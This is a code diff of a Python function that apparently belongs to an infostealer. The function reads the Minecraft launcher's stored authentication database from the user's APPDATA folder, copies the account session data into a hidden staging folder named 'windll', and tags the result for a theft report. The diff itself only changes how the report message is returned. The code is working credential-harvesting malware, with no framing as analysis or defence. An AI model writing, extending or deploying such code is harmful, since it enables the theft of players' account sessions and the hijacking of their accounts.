@@ -17,8 +17,9 @@ from manager.logger import Log
 def uuid_dashed(uuid):
     return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
 
-def Minecraft(data):
+def Minecraft():
     try:
+        msgInfo = ""
         auth_db = loads(open(getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json").read())["authenticationDatabase"]
         logs = []
         for x in auth_db:
@@ -39,12 +40,12 @@ def Minecraft(data):
                     makedirs(rf'{pathf}\windll\Games\Minecraft')
                     with open(rf'{pathf}\windll\Games\Minecraft\session.txt',"w") as file:
                         file.write(logs)
-                    data.append("\n∟🎮Minecraft")
-                    return data
+                    msgInfo+="\n∟🎮Minecraft"
+                    return msgInfo
                 except Exception as e:
                     Log(f"Minecraft(write) ---> {e}")
             except Exception as e:
                 Log(f"Minecraft({x}) ---> {e}")
     except Exception as e:
         Log(f"Minecraft(global) ---> {e}")
-        return data
+        return msgInfo
